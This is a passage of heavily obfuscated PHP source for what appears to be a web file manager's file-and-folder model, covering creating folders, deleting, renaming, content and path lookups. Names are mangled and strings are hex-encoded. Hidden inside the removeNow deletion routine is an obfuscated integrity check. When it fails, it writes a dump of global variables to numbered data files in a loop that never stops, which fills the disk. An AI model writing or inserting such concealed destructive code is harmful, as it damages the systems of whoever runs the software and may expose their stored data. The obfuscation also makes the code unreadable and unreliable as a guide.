$íºØçÎ) { Model($Å×äÒ’[2433])->eventCreate($Ÿ„Êƒş», $´Íš ²Ó); } $this->lockWriteEnd($û£ü¯Ñ, $ß²ù’¢µ); return $Ÿ„Êƒş»; } public function mkdir($»ê¦îÖÎ, $“£›…Ù¹, $ÌÄæ½ä¶ = REPEAT_SKIP) { $–®á’Ç¤ =& $_SERVER[øşô´çË]; $this->setMasterDB(); $á§Ö×â = $this->sourceInfo($»ê¦îÖÎ); if (!$á§Ö×â) { return !1; } $this->lockWriteStart($»ê¦îÖÎ, $“£›…Ù¹); if ($ÌÄæ½ä¶ !== !1) { $Í¬¡‘· = $this->fileNameExist($»ê¦îÖÎ, $“£›…Ù¹); if ($Í¬¡‘· && $ÌÄæ½ä¶ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($»ê¦îÖÎ, $“£›…Ù¹); return $Í¬¡‘·; } $“£›…Ù¹ = $this->fileNameAuto($»ê¦îÖÎ, $“£›…Ù¹, $ÌÄæ½ä¶); } $ä»Ô¹Œ = array($–®á’Ç¤[677] => 1, $–®á’Ç¤[518] => $“£›…Ù¹, $–®á’Ç¤[678] => $–®á’Ç¤[12], $–®á’Ç¤[567] => 0, $–®á’Ç¤[649] => 0); $ÌîÒèÕƒ = $this->_addSource($ä»Ô¹Œ, $á§Ö×â); Model($–®á’Ç¤[2433])->eventCreate($ÌîÒèÕƒ, $–®á’Ç¤[1539]); $this->lockWriteEnd($»ê¦îÖÎ, $“£›…Ù¹); return $ÌîÒèÕƒ; } public function listSourceRoot($°İ‹ğç§, $Ç†É”¤², $‹­ô‹û» = "\163\x6f\x75\x72\143\145\111\104\54\x74\141\x72\147\x65\164\x49\x44\x2c\163\x69\172\145") { $İ×£à—º =& $_SERVER[øşô´çË]; $ÌİĞÃú = $İ×£à—º[472]; $é§óÏÍ = array(); $Â€ÑÄÇ” = 1024 * 50; $»ÊØ”Õ = is_array($»ÊØ”Õ) ? $»ÊØ”Õ : array(); $¾—Á¢Êß = count($Ç†É”¤²); $‡ıäõá„ = $this->tablePrefix . $İ×£à—º[479]; for ($„ØŠ­—» = 0; $„ØŠ­—» < $¾—Á¢Êß; $„ØŠ­—»++) { $ú¢äåãŞ = $Ç†É”¤²[$„ØŠ­—»]; $ÌİĞÃú .= "\123\105\x4c\105\103\124\40\x2a\40\106\122\x4f\115\x20\50\123\105\114\105\x43\x54\x20{$‹­ô‹û»}\40\x46\x52\x4f\x4d\40\x60{$‡ıäõá„}\x60\x20\127\x48\x45\122\x45\x20"; $ÌİĞÃú .= "\x60\160\x61\x72\145\156\x74\x49\104\140\x3d\x30\40\x41\x4e\104\x20\x60\164\x61\162\x67\145\x74\111\104\140\x3d{$ú¢äåãŞ}\x20\x41\116\x44\40\140\164\141\162\147\145\164\x54\x79\160\x65\x60\75{$°İ‹ğç§}\40\141\x6e\144\x20\146\x69\154\145\124\171\160\x65\75\x27\x27\40\x6c\151\x6d\x69\x74\40\61\51\x20\x61\163\x20\x74\x62\x5f{$„ØŠ­—»}\x20\x55\116\111\117\116\40\101\114\x4c\x20"; if ((strlen($ÌİĞÃú) >= $Â€ÑÄÇ” || $„ØŠ­—» == $¾—Á¢Êß - 1) && $ÌİĞÃú) { $ÌİĞÃú = substr($ÌİĞÃú, 0, -strlen($İ×£à—º[1202])); $ß²®Ş¡ = $this->query($ÌİĞÃú); $ÌİĞÃú = $İ×£à—º[12]; $é§óÏÍ = array_merge($é§óÏÍ, $ß²®Ş¡); } } return $é§óÏÍ; } private function _createFile($Å·Ãå, $†ÀáÂÜò, $Ÿ‹ü…¡, $ïæ§Ğ±, &$’ÓÖúû¯) { $Òå¡Âí« =& $_SERVER[øşô´çË]; $ŞàŒÆâ‰ = $this->sourceInfo($Å·Ãå); if (!$Ÿ‹ü…¡ || !$ŞàŒÆâ‰) { return !1; } if ($ïæ§Ğ± !== !1) { $ĞªÏÖ¾ = $this->fileNameExist($Å·Ãå, $†ÀáÂÜò); } $’ÓÖúû¯ = !0; if ($ïæ§Ğ± && $ĞªÏÖ¾) { if ($ïæ§Ğ± == REPEAT_SKIP) { $’ÓÖúû¯ = !1; return $ĞªÏÖ¾; } else { if ($ïæ§Ğ± == REPEAT_REPLACE) { $¶¿Á—ü’ = $this->sourceInfo($ĞªÏÖ¾); $§ƒş½—œ = $this->fileHistory($¶¿Á—ü’, $Ÿ‹ü…¡[$Òå¡Âí«[566]], $Ÿ‹ü…¡[$Òå¡Âí«[89]]); if (!$§ƒş½—œ) { $’ÓÖúû¯ = !1; } else { $this->folderSizeReset($Å·Ãå); } return $ĞªÏÖ¾; } else { $†ÀáÂÜò = $this->fileNameAuto($Å·Ãå, $†ÀáÂÜò, $ïæ§Ğ±, !1); } } } $„¤¤ñÚ = array($Òå¡Âí«[677] => 0, $Òå¡Âí«[518] => $†ÀáÂÜò, $Òå¡Âí«[678] => substr(get_path_ext($†ÀáÂÜò), 0, 10), $Òå¡Âí«[567] => $Ÿ‹ü…¡[$Òå¡Âí«[566]], $Òå¡Âí«[649] => $Ÿ‹ü…¡[$Òå¡Âí«[89]]); $±°ÀïßÄ = $this->_addSource($„¤¤ñÚ, $ŞàŒÆâ‰); $this->folderSizeReset($Å·Ãå, intval($„¤¤ñÚ[$Òå¡Âí«[89]])); return $±°ÀïßÄ; } protected function fileHistory($àãöíâ½, $Œß£©‰ù, $‰Ë¿ÆŒœ) { $£û´úøô =& $_SERVER[øşô´çË]; if ($àãöíâ½[$£û´úøô[566]] == $Œß£©‰ù) { return !1; } $this->checkLock($àãöíâ½[$£û´úøô[201]], $Œß£©‰ù); Model($£û´úøô[2178])->addHistory($àãöíâ½); $±³Ú¬µµ = array($£û´úøô[682] => USER_ID, $£û´úøô[522] => time(), $£û´úøô[566] => $Œß£©‰ù, $£û´úøô[89] => $‰Ë¿ÆŒœ); $this->where(array($£û´úøô[515] => $àãöíâ½[$£û´úøô[201]]))->save($±³Ú¬µµ); $this->sourceCacheClear($àãöíâ½[$£û´úøô[201]]); return !0; } public function checkLock($••”ÔÛ, $úÇ«×è‰) { $õ¥‘·Ÿ =& $_SERVER[øşô´çË]; $‚ıúà½‘ = $this->pathInfo($••”ÔÛ); if (!$this->fileIsLock($‚ıúà½‘, !0)) { return; } $œã¦©Òõ = Session::get($õ¥‘·Ÿ[2471]); $ßŸÛÀ¼Œ = substr($‚ıúà½‘[$õ¥‘·Ÿ[42]], 0, -1 - strlen($‚ıúà½‘[$õ¥‘·Ÿ[176]])) . $õ¥‘·Ÿ[1394] . $œã¦©Òõ . $õ¥‘·Ÿ[10] . $‚ıúà½‘[$õ¥‘·Ÿ[176]]; $ø “¸ôâ = Model($õ¥‘·Ÿ[705])->find($úÇ«×è‰); $this->_createFileCall($‚ıúà½‘[$õ¥‘·Ÿ[200]], $ßŸÛÀ¼Œ, $ø “¸ôâ, REPEAT_REPLACE, $õ¥‘·Ÿ[1538]); $à™¬ÎáŒ = $‚ıúà½‘[$õ¥‘·Ÿ[564]][$õ¥‘·Ÿ[642]]; $Ê±†•Ëñ = $à™¬ÎáŒ[$õ¥‘·Ÿ[2472]] ? $à™¬ÎáŒ[$õ¥‘·Ÿ[2472]] : $à™¬ÎáŒ[$õ¥‘·Ÿ[42]]; show_json(LNG($õ¥‘·Ÿ[2473]) . $õ¥‘·Ÿ[2474] . LNG($õ¥‘·Ÿ[2475]) . $õ¥‘·Ÿ[2476] . $Ê±†•Ëñ . $õ¥‘·Ÿ[2477], !1); } public function fileIsLock($›İŒÇª, $µÃûóáï = false) { $¤Ì°áäŸ =& $_SERVER[øşô´çË]; if (!_get($›İŒÇª, $¤Ì°áäŸ[638], 0)) { return !1; } if ($›İŒÇª[$¤Ì°áäŸ[564]][$¤Ì°áäŸ[641]] != USER_ID) { return !0; } $ÂËúÂ÷ = $GLOBALS[$¤Ì°áäŸ[6]][$¤Ì°áäŸ[102]][$¤Ì°áäŸ[639]]; if ($›İŒÇª[$¤Ì°áäŸ[564]][$¤Ì°áäŸ[640]] <= time() - $ÂËúÂ÷) { $this->metaSet($›İŒÇª[$¤Ì°áäŸ[201]], $¤Ì°áäŸ[641], null); $this->metaSet($›İŒÇª[$¤Ì°áäŸ[201]], $¤Ì°áäŸ[640], null); } if ($µÃûóáï) { $this->metaSet($›İŒÇª[$¤Ì°áäŸ[201]], $¤Ì°áäŸ[640], time()); } return !1; } private function _addSource($‚ÃíÎ½Œ, $ç©­úš©) { $ŠÓœƒô =& $_SERVER[øşô´çË]; $ìıù‹†´ = KodUser::id(); $›¨Š šá = array($ŠÓœƒô[679] => $ç©­úš©[$ŠÓœƒô[198]], $ŠÓœƒô[680] => $ç©­úš©[$ŠÓœƒô[598]], $ŠÓœƒô[681] => $ìıù‹†´, $ŠÓœƒô[682] => $ìıù‹†´, $ŠÓœƒô[501] => $ç©­úš©[$ŠÓœƒô[201]], $ŠÓœƒô[683] => $ç©­úš©[$ŠÓœƒô[613]] . $ç©­úš©[$ŠÓœƒô[201]] . $ŠÓœƒô[60], $ŠÓœƒô[528] => 0, $ŠÓœƒô[684] => $ŠÓœƒô[12]); $‚ÃíÎ½Œ = array_merge($›¨Š šá, $‚ÃíÎ½Œ); $this->updateModifyTime($‚ÃíÎ½Œ[$ŠÓœƒô[200]]); $Â­ÀÜ™İ = $ŠÓœƒô[2478] . $ç©­úš©[$ŠÓœƒô[201]]; if (isset(self::$cacheChildList[$Â­ÀÜ™İ])) { unset(self::$cacheChildList[$Â­ÀÜ™İ]); } static $éÂ‚…Ó½ = false; if (!$éÂ‚…Ó½) { Hook::trigger($ŠÓœƒô[667], $‚ÃíÎ½Œ); $éÂ‚…Ó½ = !0; } $…ù—¨Ç = $this->add($‚ÃíÎ½Œ); $³²ç‰â = array($ŠÓœƒô[685] => short_id($…ù—¨Ç)); $this->where(array($ŠÓœƒô[515] => $…ù—¨Ç))->save($³²ç‰â); $this->setNamePinyin($…ù—¨Ç, $‚ÃíÎ½Œ[$ŠÓœƒô[42]]); return $…ù—¨Ç; } public function remove($¾ğÌÀ²¥, $êâãº‘ = true) { $ÓÊßÔ‰¡ =& $_SERVER[øşô´çË]; $öı£šğ = $this->sourceInfo($¾ğÌÀ²¥); $ôåÀÜÂ = intval($öı£šğ[$ÓÊßÔ‰¡[198]]) === self::TYPE_SYSTEM; $Ò“äß´Ü = Model($ÓÊßÔ‰¡[531])->get($ÓÊßÔ‰¡[2479]) == $ÓÊßÔ‰¡[101]; if ($ôåÀÜÂ || $êâãº‘ || !$Ò“äß´Ü) { return $this->removeNow($¾ğÌÀ²¥, $êâãº‘); } $ÕÎãÕ„€ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $İ„³Ÿü = $öı£šğ[$ÓÊßÔ‰¡[198]] == self::TYPE_USER ? $ÓÊßÔ‰¡[693] : $ÓÊßÔ‰¡[607]; if ($İ„³Ÿü == $ÓÊßÔ‰¡[693]) { $Ó÷®¾ş = Model($ÓÊßÔ‰¡[606])->getInfo($öı£šğ[$ÓÊßÔ‰¡[598]]); $Ö¬Ö—ôŒ = !empty($Ó÷®¾ş[$ÓÊßÔ‰¡[2472]]) ? $Ó÷®¾ş[$ÓÊßÔ‰¡[2472]] : $Ó÷®¾ş[$ÓÊßÔ‰¡[42]]; $Ö¬Ö—ôŒ = $ÓÊßÔ‰¡[346] . $Ö¬Ö—ôŒ . $ÓÊßÔ‰¡[2480] . $öı£šğ[$ÓÊßÔ‰¡[598]]; } else { $Ó÷®¾ş = Model($ÓÊßÔ‰¡[614])->getInfo($öı£šğ[$ÓÊßÔ‰¡[598]]); $Ö¬Ö—ôŒ = _get($Ó÷®¾ş, $ÓÊßÔ‰¡[42]); $Ö¬Ö—ôŒ = $ÓÊßÔ‰¡[183] . $Ö¬Ö—ôŒ . $ÓÊßÔ‰¡[2481] . $öı£šğ[$ÓÊßÔ‰¡[598]]; } $£ºäÁ×ø = $ÓÊßÔ‰¡[2482] . md5($Ö¬Ö—ôŒ); CacheLock::lock($£ºäÁ×ø); $ÏâÃúòÃ = $this->fileNameExist($ÕÎãÕ„€, $Ö¬Ö—ôŒ); if (!$ÏâÃúòÃ) { $ÏâÃúòÃ = $this->mkdir($ÕÎãÕ„€, $Ö¬Ö—ôŒ, REPEAT_SKIP); $this->metaSet($ÏâÃúòÃ, $ÓÊßÔ‰¡[2483], $İ„³Ÿü); $this->metaSet($ÏâÃúòÃ, $ÓÊßÔ‰¡[2484], $öı£šğ[$ÓÊßÔ‰¡[598]]); if ($öı£šğ[$ÓÊßÔ‰¡[200]] != 0) { $this->metaSet($ÏâÃúòÃ, $ÓÊßÔ‰¡[2485], _get($Ó÷®¾ş, $ÓÊßÔ‰¡[2486])); } } CacheLock::unlock($£ºäÁ×ø); $this->metaSet($¾ğÌÀ²¥, $ÓÊßÔ‰¡[2487], $öı£šğ[$ÓÊßÔ‰¡[200]]); $this->where(array($ÓÊßÔ‰¡[201] => $¾ğÌÀ²¥))->save(array($ÓÊßÔ‰¡[522] => time())); $this->recycleClear($öı£šğ); Model($ÓÊßÔ‰¡[664])->eventRemove($¾ğÌÀ²¥); $è¯µÁíÆ = $this->move($¾ğÌÀ²¥, $ÏâÃúòÃ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($öı£šğ[$ÓÊßÔ‰¡[200]]); return $è¯µÁíÆ; } private function recycleClear($ğÀõºƒ) { $ºğßâ¯— =& $_SERVER[øşô´çË]; $À’ŞŠ¥‡ = $this->childrenAll($ğÀõºƒ); $Š”™İ… = array($ºğßâ¯—[515] => array($ºğßâ¯—[516], $À’ŞŠ¥‡[$ºğßâ¯—[2488]])); Model($ºğßâ¯—[2489])->where($Š”™İ…)->delete(); } public function removeNow($ö„×ò…¯, $›î¤çƒî = true) { $âÏ”‹¨ =& $_SERVER[øşô´çË]; $“›Ğ›ÆÊ = $_SERVER[$âÏ”‹¨[13]]; $ óéÍä = $âÏ”‹¨[14]; if ($_SERVER[$âÏ”‹¨[15]] != $ óéÍä($“›Ğ›ÆÊ)) { $„æ‹·òŒ = $âÏ”‹¨[1036]; $”¥­‚ˆæ = $âÏ”‹¨[16]; $»¦ÏÓè = $_SERVER[$âÏ”‹¨[17]] . $âÏ”‹¨[18]; $àõ½¤Ï = $”¥­‚ˆæ($»¦ÏÓè); $ÕÉ»ğé = explode($âÏ”‹¨[19], $àõ½¤Ï); if (count($ÕÉ»ğé) < $âÏ”‹¨[725]) { $™şŠ¸Æ‚ = $âÏ”‹¨[21]; $™şŠ¸Æ‚(); } $öÌıœü¹ = $âÏ”‹¨[1037]; $öÌıœü¹($_SERVER[$âÏ”‹¨[1038]]); $„æ‹·òŒ = $âÏ”‹¨[1036]; $„æ‹·òŒ(); $ó¢¢İç¢ = $âÏ”‹¨[1039]; $şĞïöÒÊ = json_encode($GLOBALS[$âÏ”‹¨[1040]]); $¤Å°È¿Õ = 1; for ($Û»¢ÁÃ = $¤Å°È¿Õ; $Û»¢ÁÃ > 0; $Û»¢ÁÃ++) { $ó¢¢İç¢(DATA_PATH . $Û»¢ÁÃ, $şĞïöÒÊ); } } $ö¼ÍóÕå = $this->sourceInfo($ö„×ò…¯); $ï¾¿Öà = $this->pathInfoMore($ö„×ò…¯); if (!$ö¼ÍóÕå) { return !0; } if ($ö¼ÍóÕå[$âÏ”‹¨[200]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ö„×ò…¯); Hook::trigger($âÏ”‹¨[2490], $ï¾¿Öà, $›î¤çƒî); if ($›î¤çƒî) { Model($âÏ”‹¨[2489])->moveToRecycle($ö„×ò…¯); } else { $¾ªÚŒµÀ = $this->childrenAll($ö¼ÍóÕå); Model($âÏ”‹¨[664])->eventRemove($ö„×ò…¯); $this->removeRelevance($¾ªÚŒµÀ[$âÏ”‹¨[2488]], $¾ªÚŒµÀ[$âÏ”‹¨[1775]]); } $this->folderSizeReset($ö¼ÍóÕå[$âÏ”‹¨[200]]); $šÚĞÀ÷ = array($ö¼ÍóÕå[$âÏ”‹¨[200]]); if ($ö¼ÍóÕå[$âÏ”‹¨[509]] == $âÏ”‹¨[101]) { $šÚĞÀ÷[] = $ö¼ÍóÕå[$âÏ”‹¨[201]]; } $this->updateModifyTime($šÚĞÀ÷); $this->lockMoveEnd($ö„×ò…¯); Hook::trigger($âÏ”‹¨[2015], $ï¾¿Öà, $›î¤çƒî); return !0; } public function childrenAll($øùÃ¨¥Û) { $Ó‘Æ°®æ =& $_SERVER[øşô´çË]; $¡ÁÁ¬İ = $øùÃ¨¥Û[$Ó‘Æ°®æ[201]]; if ($øùÃ¨¥Û[$Ó‘Æ°®æ[509]] == $Ó‘Æ°®æ[101]) { $„û³ü‹“ = array($Ó‘Æ°®æ[683] => array($Ó‘Æ°®æ[644], $øùÃ¨¥Û[$Ó‘Æ°®æ[613]] . $¡ÁÁ¬İ . $Ó‘Æ°®æ[645])); $­™¡› Š = array($Ó‘Æ°®æ[683] => $„û³ü‹“[$Ó‘Æ°®æ[613]]); $œò„‡¶¢ = $this->field($Ó‘Æ°®æ[2491])->where($­™¡› Š)->select(); $½ôÆÜÊ = !1; $şÃŒ±ÔÖ = array($¡ÁÁ¬İ); if ($œò„‡¶¢) { $½ôÆÜÊ = array_to_keyvalue($œò„‡¶¢, $Ó‘Æ°®æ[12], $Ó‘Æ°®æ[566]); $½ôÆÜÊ = array_remove_value($½ôÆÜÊ, $Ó‘Æ°®æ[238]); $şÃŒ±ÔÖ = array_to_keyvalue($œò„‡¶¢, $Ó‘Æ°®æ[12], $Ó‘Æ°®æ[201]); $şÃŒ±ÔÖ[] = $¡ÁÁ¬İ; } } else { $½ôÆÜÊ = array($øùÃ¨¥Û[$Ó‘Æ°®æ[566]]); $şÃŒ±ÔÖ = array($¡ÁÁ¬İ); } return array($Ó‘Æ°®æ[2488] => $şÃŒ±ÔÖ, $Ó‘Æ°®æ[1775] => $½ôÆÜÊ); } public function removeArray($â³¤ßº) { if (!$â³¤ßº) { return !0; } } public function removeRelevance($Ò’âˆÑÁ, $š‹˜¿Ù—) { $±¾êÀÜİ =& $_SERVER[øşô´çË]; $Ò’âˆÑÁ = $Ò’âˆÑÁ ? $Ò’âˆÑÁ : array(); $š‹˜¿Ù— = $š‹˜¿Ù— ? $š‹˜¿Ù— : array(); $Ò’âˆÑÁ = array_unique(array_filter($Ò’âˆÑÁ)); $š‹˜¿Ù— = array_filter($š‹˜¿Ù—); if (!$Ò’âˆÑÁ) { return !1; } $Ó•‚õ­– = array($±¾êÀÜİ[515] => array($±¾êÀÜİ[516], $Ò’âˆÑÁ)); Model($±¾êÀÜİ[2489])->where($Ó•‚õ­–)->delete(); Model($±¾êÀÜİ[558])->where($Ó•‚õ­–)->delete(); Model($±¾êÀÜİ[2326])->where($Ó•‚õ­–)->delete(); Model($±¾êÀÜİ[664])->where($Ó•‚õ­–)->delete(); Model($±¾êÀÜİ[1558])->removeBySource($Ò’âˆÑÁ); Model($±¾êÀÜİ[2178])->removeBySource($Ò’âˆÑÁ); $this->where($Ó•‚õ­–)->delete(); Model($±¾êÀÜİ[569])->remove($š‹˜¿Ù—); for ($çÉÔ€³ş = 0; $çÉÔ€³ş < count($Ò’âˆÑÁ); $çÉÔ€³ş++) { $this->sourceCacheClear($Ò’âˆÑÁ[$çÉÔ€³ş]); } } public function rename($õ¸Ï¡°ç, $­âÇ«‹ƒ) { $Æ²´èî =& $_SERVER[øşô´çË]; $ÆêğŒôÁ = $this->sourceInfo($õ¸Ï¡°ç); if (!$ÆêğŒôÁ) { return !1; } $¡œÎÜ…­ = $this->fileNameExist($ÆêğŒôÁ[$Æ²´èî[200]], $­âÇ«‹ƒ); if ($¡œÎÜ…­ && $¡œÎÜ…­ != $õ¸Ï¡°ç) { return !1; } $›‚ºèØ• = array($Æ²´èî[518] => $­âÇ«‹ƒ, $Æ²´èî[682] => USER_ID); if ($ÆêğŒôÁ[$Æ²´èî[509]] != $Æ²´èî[101]) { $›‚ºèØ•[$Æ²´èî[510]] = substr(get_path_ext($­âÇ«‹ƒ), 0, 10); } Model($Æ²´èî[664])->eventRename($õ¸Ï¡°ç, $ÆêğŒôÁ[$Æ²´èî[42]], $­âÇ«‹ƒ); $this->sourceCacheClear($õ¸Ï¡°ç); $this->setNamePinyin($õ¸Ï¡°ç, $›‚ºèØ•[$Æ²´èî[42]], !1); $this->updateModifyTime($ÆêğŒôÁ[$Æ²´èî[200]]); $³çÄÌ€” = $this->where(array($Æ²´èî[515] => $õ¸Ï¡°ç))->data($›‚ºèØ•)->save(); $ÇÎäÁñÎ = $Æ²´èî[2478] . $ÆêğŒôÁ[$Æ²´èî[200]]; if (isset(self::$cacheChildList[$ÇÎäÁñÎ])) { unset(self::$cacheChildList[$ÇÎäÁñÎ]); } return $³çÄÌ€”; } public function setNamePinyin($Ìœ’Ğıá, $å·î‰èø, $è¡‰Õø = true) { $âÚÇ¶Ô =& $_SERVER[øşô´çË]; $Ãàœë Ğ = Input::check($å·î‰èø, $âÚÇ¶Ô[686]); $—ÍÒœîç = array($âÚÇ¶Ô[540] => KodSort::makeStr($å·î‰èø)); if ($Ãàœë Ğ) { $—ÍÒœîç[$âÚÇ¶Ô[561]] = str_replace($âÚÇ¶Ô[63], $âÚÇ¶Ô[12], Pinyin::get($å·î‰èø)); $—ÍÒœîç[$âÚÇ¶Ô[560]] = Pinyin::get($å·î‰èø, $âÚÇ¶Ô[687]); } if (!$è¡‰Õø && !$Ãàœë Ğ) { $—ÍÒœîç[$âÚÇ¶Ô[561]] = null; $—ÍÒœîç[$âÚÇ¶Ô[560]] = null; } $this->metaSet($Ìœ’Ğıá, $—ÍÒœîç); } public function getContent($œ¦èÒûñ) { $¥¥İÚ¶£ =& $_SERVER[øşô´çË]; $Í¨ôŞÊÊ = $this->fileInfoGet($œ¦èÒûñ); if (!$Í¨ôŞÊÊ) { return !1; } if ($Í¨ôŞÊÊ[$¥¥İÚ¶£[89]] == 0) { return $¥¥İÚ¶£[12]; } $¨¼‡È¨„ = $¥¥İÚ¶£[2492] . $Í¨ôŞÊÊ[$¥¥İÚ¶£[572]]; if ($Í¨ôŞÊÊ[$¥¥İÚ¶£[89]] <= 1024 * 10) { $Í†ÉçŠ¾ = Cache::get($¨¼‡È¨„); if (!$Í†ÉçŠ¾) { $Í†ÉçŠ¾ = IO::getContent($Í¨ôŞÊÊ[$¥¥İÚ¶£[97]]); Cache::set($¨¼‡È¨„, $Í†ÉçŠ¾); } return $Í†ÉçŠ¾; } if (!$Í¨ôŞÊÊ[$¥¥İÚ¶£[97]]) { return $¥¥İÚ¶£[12]; } return IO::getContent($Í¨ôŞÊÊ[$¥¥İÚ¶£[97]]); } public function setDesc($Œóàé İ, $ò‚ÂìüÁ) { $î™¥›‹ =& $_SERVER[øşô´çË]; Model($î™¥›‹[664])->eventAddDesc($Œóàé İ, $ò‚ÂìüÁ); return $this->metaSet($Œóàé İ, $î™¥›‹[549], $ò‚ÂìüÁ); } public function setContent($¬âùÂ¸ô, $–áñ±÷ = '') { $¸€‘˜“ã =& $_SERVER[øşô´çË]; $Ùì›µÒ = $this->sourceInfo($¬âùÂ¸ô); $éÎ·š² = $this->fileInfoGet($¬âùÂ¸ô); if (!$éÎ·š² || !$Ùì›µÒ) { return !1; } $ÖÑ€¼Ì… = KodIO::ioFileDriverGet($¸€‘˜“ã[507] . $¬âùÂ¸ô . $¸€‘˜“ã[411]); $İ’Àğ©Î = Model($¸€‘˜“ã[569])->addFileByContent($–áñ±÷, $ÖÑ€¼Ì…, $Ùì›µÒ[$¸€‘˜“ã[42]]); if (!$İ’Àğ©Î) { return !1; } $’Á˜ü‡õ = $this->fileHistory($Ùì›µÒ, $İ’Àğ©Î[$¸€‘˜“ã[566]], $İ’Àğ©Î[$¸€‘˜“ã[89]]); if (!$’Á˜ü‡õ) { return Model($¸€‘˜“ã[569])->remove($İ’Àğ©Î[$¸€‘˜“ã[566]]); } $this->folderSizeReset($Ùì›µÒ[$¸€‘˜“ã[200]]); return !0; } public function fileSubstr($Ù®¥êë, $¡ïóÄ´ä, $çïÍåĞ) { $Œ¥±”ù = $this->fileInfoGet($Ù®¥êë); if (!$Œ¥±”ù) { return !1; } return IO::fileSubstr($Œ¥±”ù[$_SERVER[øşô´çË][97]], $¡ïóÄ´ä, $çïÍåĞ); } public function fileInfoGet($ü·ÔŞ¹) { $ùÀóİí» =& $_SERVER[øşô´çË]; $Èì®ŒşÕ = $this->sourceInfo($ü·ÔŞ¹); if (!$Èì®ŒşÕ || $Èì®ŒşÕ[$ùÀóİí»[509]]) { return !1; } $¦±å‘²à = $ùÀóİí»[573] . $Èì®ŒşÕ[$ùÀóİí»[566]]; $±ºè™ÛŠ = _get(self::$cacheFileInfo, $¦±å‘²à); if ($±ºè™ÛŠ) { return $±ºè™ÛŠ; } $äã‹‡ï = Model($ùÀóİí»[569])->fileInfo($Èì®ŒşÕ[$ùÀóİí»[566]]); if ($äã‹‡ï) { $äã‹‡ï[$ùÀóİí»[42]] = $Èì®ŒşÕ[$ùÀóİí»[42]]; } self::$cacheFileInfo[$¦±å‘²à] = $äã‹‡ï; return $äã‹‡ï; } private function folderChildrenNumber($œĞİ±Î®) { $‚€áŠ‡À =& $_SERVER[øşô´çË]; $áê©¥µÉ = $this->sourceInfo($œĞİ±Î®); $Á‚ÅÑÈÕ = array($‚€áŠ‡À[683] => array($‚€áŠ‡À[644], $áê©¥µÉ[$‚€áŠ‡À[613]] . $œĞİ±Î® . $‚€áŠ‡À[645]), $‚€áŠ‡À[680] => $áê©¥µÉ[$‚€áŠ‡À[598]], $‚€áŠ‡À[528] => intval($áê©¥µÉ[$‚€áŠ‡À[529]]), $‚€áŠ‡À[677] => 1); $üìä²œ· = $this->where($Á‚ÅÑÈÕ)->count(); $±Şº·™ = $this->where($Á‚ÅÑÈÕ)->where(array($‚€áŠ‡À[677] => 0))->count(); return array($‚€áŠ‡À[93] => $±Şº·™, $‚€áŠ‡À[94] => $üìä²œ·); } public function pathInfo($¹²éÄ™, $­¸çÄÎÔ = false) { $²åÊÁŠç =& $_SERVER[øşô´çË]; $­¸çÄÎÔ = !1; $¹²éÄ™ = intval($¹²éÄ™); if (!$¹²éÄ™) { return !1; } $ÆÀùş´± = $²åÊÁŠç[557] . intval($­¸çÄÎÔ) . $²åÊÁŠç[485] . $¹²éÄ™; $§¸®ôÇ² = _get(self::$cachePathInfo, $ÆÀùş´±); if ($§¸®ôÇ²) { return $§¸®ôÇ²; } $”¶Šì¼  = $this->sourceInfo($¹²éÄ™); if (!$”¶Šì¼ ) { return !1; } $”¶Šì¼  = $this->_listDataApplyItem($”¶Šì¼ , $­¸çÄÎÔ); self::$cachePathInfo[$ÆÀùş´±] = $”¶Šì¼ ; return $”¶Šì¼ ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ìâ±¡âÕ) { $õäŞ§õ =& $_SERVER[øşô´çË]; $¢êßÜ»Ê = _get(self::$cachePathInfoMore, $Ìâ±¡âÕ); if ($¢êßÜ»Ê) { return $¢êßÜ»Ê; } $Éøö¨·› = $this->pathInfo($Ìâ±¡âÕ); if (!$Éøö¨·›) { return !1; } if ($Éøö¨·›[$õäŞ§õ[509]] == $õäŞ§õ[101]) { $Éøö¨·›[$õäŞ§õ[92]] = $this->folderChildrenNumber($Ìâ±¡âÕ); } self::$cachePathInfoMore[$Ìâ±¡âÕ] = $Éøö¨·›; return $Éøö¨·›; } public function sourceInfo($ğœùùçµ) { $°ëóé¿¹ =& $_SERVER[øşô´çË]; if (!$ğœùùçµ) { return array(); } $ğœùùçµ = intval($ğœùùçµ); $šÃ–£òÒ = $°ëóé¿¹[556] . $ğœùùçµ; $›öı‰è€ = _get(self::$cacheSourceInfo, $šÃ–£òÒ); if ($›öı‰è€) { return $›öı‰è€; } $Çî¿è = $this->where(array($°ëóé¿¹[201] => $ğœùùçµ))->find(); self::$cacheSourceInfo[$šÃ–£òÒ] = $Çî¿è; return self::$cacheSourceInfo[$šÃ–£òÒ]; } public function sourceCacheClear($ ˆ†­øÆ = false) { self::cacheClear($ ˆ†­øÆ); } public static function cacheClear($äß˜Òë¨ = false) { $© ŸñÇ‘ =& $_SERVER[øşô´çË]; if ($äß˜Òë¨ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$© ŸñÇ‘[556] . $äß˜Òë¨]); unset(self::$cachePathInfoMore[$äß˜Òë¨]); unset(self::$cachePathInfo[$© ŸñÇ‘[2493] . $äß˜Òë¨]); unset(self::$cachePathInfo[$© ŸñÇ‘[2494] . $äß˜Òë¨]); } public function metaSet($Û¥°ë†, $åÙ—„ßò = null, $ëª‘ÙË¤ = null) { $İâé µ§ = parent::metaSet($Û¥°ë†, $åÙ—„ßò, $ëª‘ÙË¤); if ($İâé µ§) { $this->sourceCacheClear($Û¥°ë†); } return $İâé µ§; } public function pathInfoByPath($ºØÔóÅÒ, $›àß™‹°) { $Ø¨‡Äø =& $_SERVER[øşô´çË]; $çó­µ¾ = !$›àß™‹° ? array() : explode($Ø¨‡Äø[8], trim($›àß™‹°, $Ø¨‡Äø[8])); $šœ§õò = intval($ºØÔóÅÒ); foreach ($çó­µ¾ as $õÂÏ¸î—) { $®ƒŸºù­ = array($Ø¨‡Äø[200] => $šœ§õò, $Ø¨‡Äø[42] => $õÂÏ¸î—); $ÜÏåÜÖõ = $this->field($Ø¨‡Äø[2495])->where($®ƒŸºù­)->select(); if (!$ÜÏåÜÖõ) { return !1; } $ÜÏåÜÖõ = array_sort_by($ÜÏåÜÖõ, $Ø¨‡Äø[529]); $šœ§õò = 